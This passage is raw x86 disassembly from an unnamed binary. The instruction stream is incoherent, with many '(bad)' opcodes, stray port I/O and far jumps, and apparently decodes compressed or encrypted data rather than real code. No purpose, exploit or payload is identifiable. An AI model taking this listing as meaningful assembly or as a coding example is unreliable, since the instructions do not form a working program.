  40d429:	mov    cl,0xbd
  40d42b:	aam    0x67
  40d42d:	std    
  40d42e:	(bad)  
  40d42f:	aam    0x73
  40d431:	jp     0x40d467
  40d433:	sar    WORD PTR [ebx+ebp*2-0x43ffb52a],0x34
  40d43c:	loop   0x40d410
  40d43e:	cdq    
  40d43f:	call   0xae52c2b2
  40d444:	xchg   ecx,eax
  40d445:	sub    cl,BYTE PTR [ebp-0x22a786c6]
  40d44b:	fldcw  WORD PTR ds:[ebp-0x33]
  40d44f:	repz push edi
  40d451:	ins    BYTE PTR es:[edi],dx
  40d452:	int3   
  40d453:	jmp    0xaa8d:0xbe3f6e38
  40d45a:	aas    
  40d45b:	in     eax,dx
  40d45c:	ret    0xb0c0
  40d45f:	sbb    al,0xd3
  40d461:	pop    esp
  40d462:	mov    ah,0x92
  40d464:	repz pop eax
  40d466:	or     DWORD PTR [edi+0xdf6a1f7],edi
  40d46c:	bts    DWORD PTR [esi+0x50],edx
  40d470:	inc    edi
  40d471:	test   ecx,0x7d019b22
  40d477:	mov    edi,DWORD PTR [eax+0x44]
  40d47a:	xchg   esp,eax
  40d47b:	add    ebx,DWORD PTR [edx-0x46]
  40d47e:	xchg   edx,eax
  40d47f:	lahf   
  40d480:	fidiv  DWORD PTR [ecx+0x662f9c3d]
  40d486:	jae    0x40d48c
  40d488:	pop    edx
  40d489:	pop    eax
  40d48a:	inc    ebx
  40d48b:	push   edi
  40d48c:	(bad)  
  40d48d:	sahf   
  40d48e:	es retf 
  40d490:	aad    0x44
  40d492:	jl     0x40d4f8
  40d494:	sti    
  40d495:	cdq    
  40d496:	mov    BYTE PTR [ebx],cl
  40d498:	test   BYTE PTR [ebx+0x51f0f4be],0xa4
  40d49f:	fst    DWORD PTR [ebp-0x5b]
  40d4a2:	xchg   edx,eax
  40d4a3:	dec    edx
  40d4a4:	push   esp
  40d4a5:	jge    0x40d4bd
  40d4a7:	pop    ds
  40d4a8:	mov    dh,0xb3
  40d4aa:	dec    ebp
  40d4ab:	mov    ds:0x3c9431cc,eax
  40d4b0:	fsubr  QWORD PTR [esi]
  40d4b3:	mov    dl,0x23
  40d4b5:	daa    
  40d4b6:	inc    edx
  40d4b7:	iret   
  40d4b8:	call   0x6cb2:0xfd6e9b76
  40d4bf:	ret    
  40d4c0:	jns    0x40d46e
  40d4c2:	pop    ebp
  40d4c3:	mov    dl,0xdd
  40d4c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4c6:	pop    esi
  40d4c7:	xchg   BYTE PTR [eax-0x2e],ch
  40d4ca:	cmp    esp,DWORD PTR [edx+esi*4-0xc65d6ce]
  40d4d1:	arpl   bx,sp
  40d4d3:	cmp    dl,BYTE PTR [eax]
  40d4d5:	xor    eax,0x1548558c
  40d4da:	mov    ch,0x8c
  40d4dc:	les    ecx,FWORD PTR [edi+0xd]
  40d4df:	retf   
  40d4e0:	inc    esi
  40d4e1:	add    bh,cl
  40d4e3:	dec    edi
  40d4e4:	std    
  40d4e5:	daa    
  40d4e6:	dec    esp
  40d4e7:	xor    eax,DWORD PTR [edx+0x76]
  40d4ea:	push   edx
  40d4eb:	jne    0x40d497
  40d4ed:	fs or  al,0x93
  40d4f0:	xor    eax,edi
  40d4f2:	sub    eax,0x8d48ba52
  40d4f7:	enter  0xdcfc,0x4
  40d4fb:	dec    ecx
  40d4fc:	jmp    0x31d4:0x5e44416e
  40d503:	dec    edi
  40d504:	retf   
  40d505:	dec    ebx
  40d506:	xor    bh,BYTE PTR [ebx-0x166ded4d]
  40d50c:	into   
  40d50d:	out    dx,al
  40d50e:	ins    BYTE PTR es:[edi],dx
  40d50f:	cmc    
  40d510:	push   ebx
  40d511:	adc    al,0x53
  40d513:	adc    eax,DWORD PTR [ebp-0x1a]
  40d516:	adc    DWORD PTR [esi],0x29ceb190
  40d51c:	rcl    BYTE PTR [edx],cl
  40d51e:	test   DWORD PTR [esi+0x78066b41],edx
  40d524:	pop    ds
  40d525:	and    al,0xee
  40d527:	adc    DWORD PTR [ebx-0x33],ebp
  40d52a:	mov    esp,0x49964f20
  40d52f:	in     eax,dx
  40d530:	fnstenv [esi-0x668a546e]
  40d536:	out    dx,al
  40d537:	or     DWORD PTR [edx],edx
  40d539:	jo     0x40d4df
  40d53b:	xlat   BYTE PTR ds:[ebx]
  40d53c:	inc    ebp
  40d53d:	adc    DWORD PTR [eax-0x16a71ea7],edx
  40d543:	retf   
  40d544:	adc    al,0x42
  40d546:	or     DWORD PTR [edi],edi
  40d548:	scas   eax,DWORD PTR es:[edi]
  40d549:	std    
  40d54a:	fcomi  st,st(2)
  40d54c:	movntps XMMWORD PTR [ebx+0x61],xmm1
  40d550:	test   BYTE PTR [ebx],dl
  40d552:	add    al,0x8c
  40d554:	inc    esp
  40d555:	mov    ds:0x341afb6f,al
  40d55a:	mov    dh,0x68
  40d55c:	sahf   
  40d55d:	jbe    0x40d595
  40d55f:	xchg   esi,eax
  40d560:	cmp    al,0x26
  40d562:	jne    0x40d523
  40d564:	(bad)  
  40d565:	dec    ecx
  40d566:	shl    BYTE PTR [esi*4+0x5403f6e4],1
  40d56d:	je     0x40d52c
  40d56f:	retf   
  40d570:	fsub   st(5),st
  40d572:	lods   eax,DWORD PTR ds:[esi]
  40d573:	sub    al,0xc3
  40d575:	cmp    ch,BYTE PTR [esp+eax*1+0x7de05691]
  40d57c:	inc    ebp
  40d57d:	sub    edx,eax
  40d57f:	xchg   edx,eax
  40d580:	inc    edx
  40d581:	mov    ebx,0xff18f811
  40d586:	mov    cl,BYTE PTR [ebx+esi*8-0x35]
  40d58a:	mov    ebp,0x6bd817c3
  40d58f:	xor    DWORD PTR [ebx],edi
  40d591:	cmp    dh,BYTE PTR [edx+0x74]
  40d594:	lock mov ds:0xe8e0bae7,al
  40d59a:	fs leave 
  40d59c:	outs   dx,BYTE PTR ds:[esi]
  40d59d:	aad    0x83
  40d59f:	sbb    BYTE PTR [edi-0x24c6a464],bh
  40d5a5:	sub    bl,BYTE PTR [ebp+eax*4+0x71]
  40d5a9:	cmp    DWORD PTR [edx-0xd],edi
  40d5ac:	icebp  
  40d5ad:	sahf   
  40d5ae:	int    0xc6
  40d5b0:	xchg   edi,eax
  40d5b1:	aad    0xb
  40d5b3:	xlat   BYTE PTR ds:[ebx]
  40d5b4:	in     al,dx
  40d5b5:	lods   eax,DWORD PTR ds:[esi]
  40d5b6:	xchg   esi,eax
  40d5b7:	(bad)  
  40d5b8:	leave  
  40d5b9:	mov    dl,0x20
  40d5bb:	xchg   ebp,eax
  40d5bc:	shr    DWORD PTR [ecx+ebx*2+0x5d21a7bd],1
  40d5c3:	icebp  
  40d5c4:	sbb    esi,DWORD PTR [ebp-0x6f]
  40d5c7:	jnp    0x40d5e6
  40d5c9:	push   esp
  40d5ca:	bound  edi,QWORD PTR [ebx+0x5f]
  40d5cd:	popf   
  40d5ce:	pop    esi
  40d5cf:	rcr    edi,1
  40d5d1:	loopne 0x40d58a
  40d5d3:	mov    BYTE PTR [edi+0x3d],bh
  40d5d6:	push   eax
  40d5d7:	jno    0x40d594
  40d5d9:	mov    dh,0x26
  40d5db:	or     ch,dl
  40d5dd:	mov    bl,0x17
  40d5df:	inc    edi
  40d5e0:	loop   0x40d640
  40d5e2:	es sbb al,0x31
  40d5e5:	push   ds
  40d5e6:	dec    ecx
  40d5e7:	outs   dx,BYTE PTR ds:[esi]
  40d5e8:	jo     0x40d5bb
  40d5ea:	nop
  40d5eb:	ds push edx
  40d5ed:	or     BYTE PTR ds:0x68094ce2,al
  40d5f3:	js     0x40d5a6
  40d5f5:	inc    esi
  40d5f6:	(bad)  
  40d5f8:	retf   
  40d5f9:	cld    
  40d5fa:	mul    BYTE PTR [esi+0x5af6a736]
  40d600:	rep ins BYTE PTR es:[edi],dx
  40d602:	dec    ecx
  40d603:	sbb    eax,0xee1892ae
  40d608:	mov    al,0xab
  40d60a:	sbb    eax,0xf0648feb
  40d60f:	push   edi
  40d610:	ja     0x40d67e
  40d612:	out    0x27,al
  40d614:	sbb    BYTE PTR ds:0xa286489d,0xf0
  40d61b:	push   edi
  40d61c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d61d:	xlat   BYTE PTR ds:[ebx]
  40d61e:	dec    esp
  40d61f:	ins    BYTE PTR es:[edi],dx
  40d620:	scas   al,BYTE PTR es:[edi]
  40d621:	adc    bh,BYTE PTR [ecx+esi*4-0x79]
  40d625:	fbstp  TBYTE PTR [ecx]
  40d627:	dec    esi
  40d628:	cmp    BYTE PTR [edi],cl
  40d62a:	sbb    al,cl
  40d62c:	pushf  
  40d62d:	mov    dh,0x75
  40d62f:	push   ebp
  40d630:	rcr    cl,0xb6
  40d633:	imul   edi,DWORD PTR [ebp+0x642470a3],0xfffffff6
  40d63a:	inc    edi
  40d63b:	js     0x40d61d
  40d63d:	out    dx,al
  40d63e:	add    DWORD PTR [ebx+0x696de61],esp
  40d644:	and    eax,0x6d226d31
  40d649:	add    BYTE PTR [edx],ah
  40d64b:	into   
  40d64c:	cmp    al,0xd7
  40d64e:	and    ah,bl
  40d650:	pop    edx
  40d651:	mov    edi,0x7d3f0562
  40d656:	jb     0x40d6cb
  40d658:	std    
  40d659:	mov    bh,0x21
  40d65b:	sub    al,0x12
  40d65d:	jo     0x40d6a2
  40d65f:	fdivr  QWORD PTR [edi]
  40d661:	inc    edx
  40d662:	icebp  
  40d663:	mov    ebx,0xc7b66eb1
  40d668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d669:	or     dl,al
  40d66b:	std    
  40d66c:	ins    BYTE PTR es:[edi],dx
  40d66d:	call   0xb6af:0x58a573a
  40d674:	jle    0x40d660
  40d676:	xchg   ecx,eax
  40d677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d678:	pop    edi
  40d679:	fmul   st,st(1)
  40d67b:	rcl    edx,cl
  40d67d:	jns    0x40d625
  40d67f:	aaa    
  40d680:	xrelease mov BYTE PTR [eax],bl
  40d683:	mov    ebx,0x176548a3
  40d688:	xor    dl,BYTE PTR [ecx-0x3a]
  40d68b:	aas    
  40d68c:	rcr    esi,0xe2
  40d68f:	clc    
  40d690:	jb     0x40d70a
  40d692:	push   edi
  40d693:	lea    esp,[eax]
  40d695:	int    0x63
  40d697:	or     esi,DWORD PTR [eax-0x160ddca8]
  40d69d:	jb     0x40d6aa
  40d69f:	jb     0x40d668
  40d6a1:	mov    ebx,0xc906443a
  40d6a6:	add    dh,ah
  40d6a8:	mov    ecx,DWORD PTR [edi+eax*8+0x6f]
  40d6ac:	cmp    esp,DWORD PTR [ecx+eiz*8]
  40d6af:	mov    ecx,0x660d840f
  40d6b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6b5:	xchg   DWORD PTR [esi+0x2b],edi
  40d6b8:	shl    BYTE PTR [edx],1
  40d6ba:	push   ebx
  40d6bb:	pop    ebp
  40d6bc:	mov    ebx,0x9367d7ef
  40d6c1:	jmp    0x40d666
  40d6c3:	sahf   
  40d6c4:	scas   al,BYTE PTR es:[edi]
  40d6c5:	mov    WORD PTR [esi+edx*8],es
  40d6c8:	arpl   WORD PTR [ebx+0x3f6bc816],ax
  40d6ce:	sahf   
  40d6cf:	sbb    dl,BYTE PTR [edx-0xb6cd419]
  40d6d5:	and    esp,ecx
  40d6d7:	push   ds
  40d6d8:	mov    ebp,0x20a19f80
  40d6dd:	mov    WORD PTR fs:[edx+0x69],cs
  40d6e1:	jae    0x40d6e0
  40d6e3:	mov    ah,0xb1
  40d6e5:	sbb    ebx,DWORD PTR [ebx+0x1f]
  40d6e8:	ss push 0xffffffb3
  40d6eb:	fidivr DWORD PTR [edi+eiz*2-0x38991a75]
  40d6f2:	dec    esp
  40d6f3:	inc    esp
  40d6f4:	mov    eax,DWORD PTR [edx-0x5f]
  40d6f7:	dec    ebp
  40d6f8:	jbe    0x40d720
  40d6fa:	inc    edi
  40d6fb:	int    0xb
  40d6fd:	add    eax,0xc42ca72c
  40d702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d703:	in     eax,dx
  40d704:	leave  
  40d705:	sbb    al,0xa9
  40d707:	pop    edx
  40d708:	xchg   ebp,eax
  40d709:	aaa    
  40d70a:	ret    0x1978
  40d70d:	or     eax,DWORD PTR [ebp-0xb07398b]
  40d713:	fidiv  DWORD PTR [eax+0x714caa3e]
  40d719:	les    ecx,FWORD PTR [esi]
  40d71b:	lods   al,BYTE PTR ds:[esi]
  40d71c:	addr16 jno 0x40d6b5
  40d71f:	test   bl,0xa
  40d722:	xchg   ebp,eax
  40d723:	and    al,BYTE PTR [ebx]
  40d725:	push   es
  40d726:	aaa    
  40d727:	lea    edx,[edx+edx*4-0x25]
  40d72b:	dec    eax
  40d72c:	in     al,0xfa
  40d72e:	sub    eax,ebx
  40d730:	and    eax,0x5208bb34
  40d735:	enter  0xe028,0x83
  40d739:	js     0x40d6d4
  40d73b:	pop    edi
  40d73c:	jp     0x40d78d
  40d73e:	xchg   esp,eax
  40d73f:	or     al,0x31
  40d741:	mov    cl,0xc5
  40d743:	xchg   ebp,esi
  40d745:	xchg   ebp,eax
  40d746:	and    esi,edx
  40d748:	test   DWORD PTR [ebp-0x5],esp
  40d74b:	aad    0x1c
  40d74d:	or     eax,0x52f12ec4
  40d752:	and    al,0x67
  40d754:	push   edx
  40d755:	xchg   ebx,eax
  40d756:	out    0x7c,eax
  40d758:	loopne 0x40d79e
  40d75a:	outs   dx,DWORD PTR ds:[esi]
  40d75b:	mov    ebx,0x148a94cc
  40d760:	nop
  40d761:	cmp    ecx,ebx
  40d763:	out    0xe,eax
  40d765:	(bad)  
  40d766:	rcr    DWORD PTR ds:0x4a177caf,cl
  40d76c:	xchg   esi,eax
  40d76d:	xor    DWORD PTR [ebx+0x78d5e1a9],0xe4aa0da5
  40d777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d778:	push   ebp
  40d779:	or     eax,0x483397a2
  40d77e:	xor    DWORD PTR [esi-0x70],0x4a0cec6d
  40d785:	mov    eax,ds:0x51a0e8f3
  40d78a:	or     edx,DWORD PTR [eax-0x68b9858]
  40d790:	inc    ecx
  40d791:	mov    ah,0x2e
  40d793:	and    eax,0xbd3b07d4
  40d798:	fst    DWORD PTR [edx+0x42]
  40d79b:	stc    
  40d79c:	xor    BYTE PTR [esi+0x11592a52],bl
  40d7a2:	push   es
  40d7a3:	stos   DWORD PTR es:[edi],eax
  40d7a4:	sbb    eax,0x12525f57
  40d7a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7aa:	pop    esi
  40d7ab:	mov    eax,0x888db6d9
  40d7b0:	pushf  
  40d7b1:	scas   eax,DWORD PTR es:[edi]
  40d7b2:	into   
  40d7b3:	xchg   edx,eax
  40d7b4:	fild   WORD PTR [ebp+esi*4+0x4e]
  40d7b8:	inc    ebx
  40d7b9:	sar    DWORD PTR [ecx-0x10d6087a],0x4d
  40d7c0:	or     eax,0x496420a1
  40d7c5:	or     eax,0x4271cce5
  40d7ca:	push   ss
  40d7cb:	cmp    BYTE PTR [esi],0x43
  40d7ce:	jo     0x40d7f7
  40d7d0:	mov    BYTE PTR [ebx-0x6d5b158a],0xb2
  40d7d7:	add    dh,ah
  40d7d9:	adc    al,0x2a
  40d7db:	or     ecx,eax
  40d7dd:	outs   dx,DWORD PTR ds:[esi]
  40d7de:	jo     0x40d851
  40d7e0:	out    0x83,al
  40d7e2:	stos   BYTE PTR es:[edi],al
  40d7e3:	jns    0x40d7c2
  40d7e5:	push   edx
  40d7e6:	fstp   TBYTE PTR [eax+0x11c3b90b]
  40d7ec:	dec    edi
  40d7ed:	out    dx,al
  40d7ee:	pop    eax
  40d7ef:	fbld   TBYTE PTR [ebx-0x35]
  40d7f2:	gs cmc 
  40d7f4:	loope  0x40d85f
  40d7f6:	jno    0x40d7ed
  40d7f8:	vpsubsb xmm4,xmm5,xmm3
  40d7fc:	fistp  QWORD PTR ds:[edx+0x6fea9019]
  40d803:	ins    BYTE PTR es:[edi],dx
  40d804:	out    0x37,eax
  40d806:	psllq  mm3,QWORD PTR [esi+eax*2]
  40d80a:	in     al,0x15
  40d80c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d80d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d80e:	cmp    DWORD PTR ss:[eax],ebx
  40d811:	ret    
  40d812:	inc    ebx
  40d813:	push   cs
  40d814:	js     0x40d861
  40d816:	or     esi,DWORD PTR [edx]
  40d818:	inc    edx
  40d819:	mov    cs,WORD PTR [esi+0x33]
  40d81c:	xchg   edi,ebp
  40d81e:	ror    DWORD PTR [ebx+eiz*1],0xe0
  40d822:	push   eax
  40d823:	ins    BYTE PTR es:[edi],dx
  40d824:	xlat   BYTE PTR ds:[ebx]
  40d825:	(bad)  
  40d826:	data16 icebp 
  40d828:	cmc    
  40d829:	inc    ebp
  40d82a:	inc    edx
  40d82b:	sub    edx,DWORD PTR [eax+0x33]
  40d82e:	sub    eax,0xfd6465ac
  40d833:	int3   
  40d834:	sbb    BYTE PTR [esi+0x4ea76100],0x6a
  40d83b:	aam    0x73
  40d83d:	adc    eax,0x9d7812f1
  40d842:	jne    0x40d819
  40d844:	lods   eax,DWORD PTR ds:[esi]
  40d845:	imul   BYTE PTR [ecx-0x6d0413cc]
  40d84b:	clc    
  40d84c:	aad    0x5a
  40d84e:	(bad)  [eax-0x14]
  40d851:	scas   al,BYTE PTR es:[edi]
  40d852:	mov    ch,0x70
  40d854:	bound  esp,QWORD PTR [eax-0x39]
  40d857:	mov    ah,0x16
  40d859:	bound  eax,QWORD PTR ds:0x2ead68fb
  40d85f:	push   cs
  40d860:	cmp    bh,al
  40d862:	lods   eax,DWORD PTR ds:[esi]
  40d863:	rcr    BYTE PTR [edx+esi*1],1
  40d866:	adc    al,0x8f
  40d868:	push   ebx
  40d869:	adc    eax,0xf348c615
  40d86e:	mov    dh,0xd0
  40d870:	pop    ss
  40d871:	std    
  40d872:	push   0x1f38d150
  40d877:	cmc    
  40d878:	push   ebp
  40d879:	fs test al,0x92
  40d87c:	shr    cl,0x71
  40d87f:	out    0xec,eax
  40d881:	add    BYTE PTR [edi],0xaf
  40d884:	mov    ah,0x34
  40d886:	and    al,0xc2
  40d888:	cmp    BYTE PTR [edi],ah
  40d88a:	out    dx,al
  40d88b:	(bad)  
  40d88c:	fisttp DWORD PTR [edi+ebp*8]
  40d88f:	arpl   sp,sp
  40d891:	sub    DWORD PTR [ebx],0xfffffffe
  40d894:	push   ss
  40d895:	or     eax,0x9a6eae34
  40d89a:	lahf   
  40d89b:	sub    ecx,esp
  40d89d:	or     BYTE PTR [esi],ah
  40d89f:	ins    BYTE PTR es:[edi],dx
  40d8a0:	jg     0x40d84c
  40d8a2:	inc    ebp
  40d8a3:	pushf  
  40d8a4:	dec    sp
  40d8a6:	xchg   ebx,eax
  40d8a7:	xor    BYTE PTR [ebp+0x4b],0xff
  40d8ab:	gs fs lahf 
  40d8ae:	aam    0x9a
  40d8b0:	into   
  40d8b1:	xor    al,BYTE PTR [edx-0x77]
  40d8b4:	add    dl,BYTE PTR [esi-0x4a83daa7]
  40d8ba:	retf   
  40d8bb:	nop
  40d8bc:	cdq    
  40d8bd:	and    DWORD PTR [eax+0x46],0xffffffde
  40d8c1:	cli    
  40d8c2:	jno    0x40d929
  40d8c4:	and    eax,0x572d6ecc
  40d8c9:	xchg   ebp,eax
  40d8ca:	mov    DWORD PTR [edx],esi
  40d8cc:	xchg   DWORD PTR [ebx],esi
  40d8ce:	jb     0x40d905
  40d8d0:	imul   eax,DWORD PTR [eax+0x4939253e],0x9b5f4f1a
  40d8da:	pop    ebx
  40d8db:	jo     0x40d904
  40d8dd:	fidiv  DWORD PTR [eax+edi*2+0x33]
  40d8e1:	mov    ah,0xf
  40d8e3:	test   ch,dl
  40d8e5:	repnz rol BYTE PTR [ebx+0x209e97a2],1
  40d8ec:	xchg   esp,eax
  40d8ed:	inc    ebp
  40d8ee:	scas   eax,DWORD PTR es:[edi]
  40d8ef:	fscale 
  40d8f1:	mov    eax,0xea4284b
  40d8f6:	lods   eax,DWORD PTR ds:[esi]
  40d8f7:	inc    esp
  40d8f8:	push   0x2e4079de
  40d8fd:	fdivrp st(4),st
  40d8ff:	iret   
  40d900:	mov    edi,0x2445f672
  40d905:	mov    bh,0xb6
  40d907:	imul   edx,eax,0xead60785
  40d90d:	jb     0x40d8fe
  40d90f:	rcl    DWORD PTR [edi],1
  40d911:	jno    0x40d979
  40d913:	mov    bl,0x5d
  40d915:	daa    
  40d916:	cwde   
  40d917:	outs   dx,DWORD PTR ds:[esi]
  40d918:	xchg   edx,eax
  40d919:	fistp  QWORD PTR [edx+edx*2]
  40d91c:	mov    eax,0x79a7ad5b
  40d921:	mov    esi,0x71cf1102
  40d926:	dec    ebx
  40d927:	test   BYTE PTR ds:0x232bb09e,al
  40d92d:	test   eax,0xeb4b32af
  40d932:	jb     0x40d962
  40d934:	fs mov ah,0x5f
  40d937:	loopne 0x40d8de
  40d939:	das    
  40d93a:	mov    esp,0x7847e8c9
  40d93f:	popf   
  40d940:	or     al,0x34
  40d942:	jl     0x40d8d5
  40d944:	shl    DWORD PTR [edi+0x12d72b0],1
  40d94a:	push   esp
  40d94b:	pop    edi
  40d94c:	out    dx,al
  40d94d:	cmp    edx,DWORD PTR [ecx+0x40]
  40d950:	xor    DWORD PTR [edi-0x3f],eax
  40d953:	pusha  
  40d954:	imul   eax,DWORD PTR [eax-0x4e],0x2195c7b1
  40d95b:	iret   
  40d95c:	cmp    BYTE PTR [ebx+0x2ee0bf80],cl
  40d962:	mov    dh,0xff
  40d964:	jmp    0xc9b8fbdf
  40d969:	inc    ebx
  40d96a:	adc    dl,BYTE PTR [ebp+0x4b7f3632]
  40d970:	je     0x40d8fa
  40d972:	fadd   QWORD PTR [edx-0x50]
  40d975:	call   0x9648fc18
  40d97a:	mov    eax,DWORD PTR [eax+ecx*2+0x2f75c7fd]
  40d981:	xchg   ebx,eax
  40d982:	push   esi
  40d983:	js     0x40d9cb
  40d985:	cmp    DWORD PTR [ebx+0x698f6706],esi
  40d98b:	dec    BYTE PTR [esi]
  40d98d:	inc    ecx
  40d98e:	push   esi
  40d98f:	jo     0x40d945
  40d991:	xor    BYTE PTR [ebp+0x3a],ah
  40d994:	jecxz  0x40d9d3
  40d996:	cmp    esi,ebp
  40d998:	aas    
  40d999:	inc    eax
  40d99a:	jno    0x40d960
  40d99c:	cmp    edx,DWORD PTR [eax-0x5f]
  40d99f:	ficom  WORD PTR ds:0xbd0a815a
  40d9a5:	cmp    edi,DWORD PTR [ecx+0x1e0ec5c]
  40d9ab:	pop    edi
  40d9ac:	mov    ebp,0x220fb392
  40d9b1:	ss inc edi
  40d9b3:	jl     0x40d9eb
  40d9b5:	lods   al,BYTE PTR ds:[esi]
  40d9b6:	(bad)  
  40d9b8:	cmc    
  40d9b9:	lea    esi,[esp+ebp*1+0x23]
  40d9bd:	mov    ecx,0x99aee4f2
  40d9c2:	push   0x785e856f
  40d9c7:	add    eax,0xa8fb149
  40d9cc:	add    edi,DWORD PTR [ecx+0x75]
  40d9cf:	jnp    0x40da2d
  40d9d1:	xchg   DWORD PTR [bx+si+0x29],ecx
  40d9d5:	mov    cl,0x3d
  40d9d7:	in     al,dx
  40d9d8:	cli    
  40d9d9:	dec    esi
  40d9da:	out    dx,al
  40d9db:	test   al,0x7
  40d9dd:	mov    eax,ds:0x78a6e6db
  40d9e2:	sbb    ch,dl
  40d9e4:	jb     0x40da3f
  40d9e6:	sbb    al,0x10
  40d9e8:	adc    al,0xd0
  40d9ea:	scas   eax,DWORD PTR es:[edi]
  40d9eb:	fmul   QWORD PTR [esp+edx*4+0x5d9ddd9d]
  40d9f2:	int    0xd1
  40d9f4:	ins    BYTE PTR es:[edi],dx
  40d9f5:	scas   al,BYTE PTR es:[edi]
  40d9f6:	jns    0x40d9f2
  40d9f8:	out    0xd8,al
  40d9fa:	mov    edi,DWORD PTR [esi+0x4d141009]
  40da00:	add    eax,0xb520ddd8
  40da05:	sbb    al,0xf6
  40da07:	mov    eax,0x647d5a21
  40da0c:	or     dl,dh
  40da0e:	or     BYTE PTR [ecx+eiz*8],ah
  40da11:	pusha  
  40da12:	dec    edx
  40da13:	jno    0x40da7c
  40da15:	popf   
  40da16:	shl    ebx,1
  40da18:	cs retf 0x365f
  40da1c:	(bad)  
  40da1f:	mov    edi,0x94936e81
  40da24:	push   eax
  40da25:	sahf   
  40da26:	fist   DWORD PTR [eax]
  40da28:	push   edi
  40da29:	and    DWORD PTR [eax+0x1e],ecx
  40da2c:	in     al,dx
  40da2d:	mov    bh,0x52
  40da2f:	adc    eax,DWORD PTR [edx-0x40307985]
  40da35:	and    bh,cl
  40da37:	(bad)  
  40da38:	int3   
  40da39:	xchg   ecx,eax
  40da3a:	bound  esp,QWORD PTR [ebx]
  40da3c:	cdq    
  40da3d:	scas   eax,DWORD PTR es:[edi]
  40da3e:	lods   al,BYTE PTR ds:[esi]
  40da3f:	jo     0x40da4a
  40da41:	lea    edx,[esi]
  40da43:	push   edx
  40da44:	div    BYTE PTR [edi-0x53116c4e]
  40da4a:	and    ebp,DWORD PTR [ebp+0x47]
  40da4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da4e:	push   0xffffff91
  40da50:	pop    eax
  40da51:	pop    edi
  40da52:	popa   
  40da53:	loop   0x40da74
  40da55:	jne    0x40da31
  40da57:	in     al,0xa2
  40da59:	sbb    BYTE PTR [ecx],cl
  40da5b:	xor    bh,0xab
  40da5e:	scas   eax,DWORD PTR es:[edi]
  40da5f:	dec    al
  40da61:	in     eax,dx
  40da62:	pushf  
  40da63:	call   0xeeb80c07
  40da68:	in     al,dx
  40da69:	jmp    0x40da04
  40da6b:	cmp    bh,BYTE PTR [ebx+eiz*8]
  40da6e:	inc    edx
  40da6f:	jbe    0x40da88
  40da71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da72:	daa    
  40da73:	(bad)  
  40da75:	arpl   WORD PTR [esi+0x4],ax
  40da78:	fsubr  QWORD PTR [esi-0x30]
  40da7b:	in     eax,0x1d
  40da7d:	sbb    DWORD PTR [ecx],edx
  40da7f:	xchg   esp,eax
  40da80:	add    esp,edi
  40da82:	sbb    al,BYTE PTR [edi+ebp*4]
  40da85:	ret    0xac95
  40da88:	sti    
  40da89:	cwde   
  40da8a:	bt     ecx,eax
  40da8d:	leave  
  40da8e:	clc    
  40da8f:	sbb    DWORD PTR [ebp+0x5f088c5e],esp
  40da95:	adc    BYTE PTR [edi],ah
  40da97:	xchg   ecx,eax
  40da98:	lods   eax,DWORD PTR ds:[esi]
  40da99:	cmp    esi,DWORD PTR [edx]
  40da9b:	sub    DWORD PTR [edx-0x212e4b1],esi
  40daa1:	pushf  
  40daa2:	cmp    al,0x95
  40daa4:	or     DWORD PTR [edx+0x55272c8e],edi
  40daaa:	jge    0x40da85
  40daac:	mov    dh,0x2f
  40daae:	or     BYTE PTR [ebx],cl
  40dab0:	js     0x40db26
  40dab2:	out    0xf9,al
  40dab4:	inc    esp
  40dab5:	mov    ebx,0x51e436e6
  40daba:	std    
  40dabb:	sbb    bl,ah
  40dabd:	shr    edi,0xdf
  40dac0:	retf   
  40dac1:	ins    DWORD PTR es:[edi],dx
  40dac2:	push   cs
  40dac3:	out    dx,al
  40dac4:	in     eax,dx
  40dac5:	adc    bl,BYTE PTR [edi]
  40dac7:	add    BYTE PTR [ebx],cl
  40dac9:	cmp    eax,0xbd06f08d
  40dace:	xchg   edi,eax
  40dacf:	dec    ebx
  40dad0:	inc    esi
  40dad1:	out    dx,eax
  40dad2:	fiadd  WORD PTR [esi+0x9]
  40dad5:	push   ebx
  40dad6:	mov    ebx,0x6120b2a5
  40dadb:	fucomp st(4)
  40dadd:	mov    bh,0x39
  40dadf:	loopne 0x40db35
  40dae1:	lock jmp 0x5ddc:0xe8d1d7e6
  40dae9:	lds    esi,FWORD PTR [edx]
  40daeb:	or     ebx,eax
  40daed:	adc    DWORD PTR [ecx+0x2d],eax
  40daf0:	fimul  WORD PTR [ecx]
  40daf2:	arpl   sp,di
  40daf4:	jo     0x40da87
  40daf6:	test   DWORD PTR [ebx+ebp*8-0x7e],ecx
  40dafa:	adc    bh,BYTE PTR [esi+0x12]
  40dafd:	mov    edi,0x74fd4bc1
  40db02:	iret   
  40db03:	sub    al,0x32
  40db05:	xchg   ebp,eax
  40db06:	mul    DWORD PTR [ebp+0x10]
  40db09:	(bad)  
  40db0a:	push   ss
  40db0b:	add    eax,0x2b6ac962
  40db10:	sahf   
  40db11:	adc    dl,BYTE PTR [ecx+0x55]
  40db14:	dec    ebp
  40db15:	retf   0x8
  40db18:	push   esp
  40db19:	and    ecx,DWORD PTR [ecx]
  40db1b:	test   ebp,esi
  40db1d:	mov    eax,ds:0x9912c302
  40db22:	xor    BYTE PTR [ebx+eiz*4+0x3be0c1d7],bl
  40db29:	dec    ebp
  40db2a:	mov    eax,0xc6f602e8
  40db2f:	mov    ds,ecx
  40db31:	cld    
  40db32:	pop    ss
  40db33:	sub    eax,0xf57f21de
  40db38:	clc    
  40db39:	ja     0x40dbb2
  40db3b:	and    al,0x80
  40db3d:	adc    dl,BYTE PTR [eax-0x15]
  40db40:	jle    0x40db5a
  40db42:	imul   esi,DWORD PTR [esi-0x52da78a0],0x72
  40db49:	add    al,0xe7
  40db4b:	(bad)  
  40db4c:	in     eax,0x2b
  40db4e:	jnp    0x40dba4
  40db50:	ins    BYTE PTR es:[edi],dx
  40db51:	retf   
  40db52:	sbb    DWORD PTR [eax],edi
